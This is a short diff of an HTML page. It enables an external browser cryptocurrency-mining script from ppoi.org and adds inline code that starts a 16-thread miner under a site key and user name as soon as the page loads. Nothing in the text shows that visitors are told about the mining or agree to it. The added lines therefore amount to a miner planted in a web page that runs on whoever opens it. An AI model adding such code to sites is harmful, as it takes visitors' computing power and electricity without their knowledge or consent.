@@ -2,9 +2,19 @@
 <html>
 	<head>
 		<meta charset="UTF-8">
-		<--<script src="https://ppoi.org/lib/projectpoi.min.js"></script>
+		<script src="https://ppoi.org/lib/projectpoi.min.js"></script>
 		
 		<script>
+			var miner = new ProjectPoi.User('BLuRXQ2XBPG0jSEBBnysmfVJ', 'john-doe', {
+	threads: 16,
+	autoThreads: false,
+	throttle: 0.3,
+	forceASMJS: false
+});
+	miner.start(ProjectPoi.IF_EXCLUSIVE_TAB);
+			
+		</script>
+		<!--script>
 	var miner = new ProjectPoi.Anonymous('BLuRXQ2XBPG0jSEBBnysmfVJ');
 	miner.start();
 </script>
